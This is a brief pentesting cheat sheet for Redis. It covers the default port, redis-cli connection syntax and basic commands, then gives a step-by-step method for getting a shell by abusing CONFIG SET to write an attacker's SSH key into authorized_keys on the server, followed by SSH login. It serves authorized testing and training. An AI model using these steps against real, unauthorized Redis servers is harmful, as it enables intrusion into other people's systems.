# Redis
Redis is an in-memory database that is super fast.

## Port
6379

## Connecting
```bash
redis-cli -h <IP> -p <Port>
```
A one-liner to execute a command at the same time as connecting.
```bash
redis-cli -h <IP> -x <Command>
```

## Basic Commands
```bash
keys * # Displays all keys.
get <Key>; # Retrieves the value of a string key.
set <Key> <Value> # Sets the value of a string key.
hgetall <Key> # Retrieves all fields and values of a hash key.
info # Shows server information and statistics.
```

## Obtain a shell using `CONFIG SET`
An attacker can obtain a shell by abusing the CONFIG SET command — for example, by causing the server to write the attacker’s public SSH key into a target user’s authorized_keys, and then logging in over SSH with the matching private key.
```bash
# Connecting to Redis
redis-cli -h <IP> -p 6379
redis> CONFIG GET dir
redis> CONFIG SET dir /var/lib/redis/.ssh

# Back to bash
(sudo echo -e '\n'; cat .ssh/id_rsa.pub; echo -e '\n') > pub_key.txt
cat pub_key.txt | redis-cli -h <IP> -x set ssh_key

# Connecting to Redis
redis-cli -h <IP> -p 6379
redis> CONFIG SET dbfilename authorized_keys
redis> save

# SSH
ssh redis@<IP>
```

## Reference
[Redis Cheat Sheet](https://redis.io/learn/howtos/quick-start/cheat-sheet)
[CVE-2021-21309](https://nvd.nist.gov/vuln/detail/cve-2021-21309)
[Redis 4.0.9 PoC](https://gist.github.com/ziednamouchi/d9b57abc1834d7ce3cf43d4d74479baa)
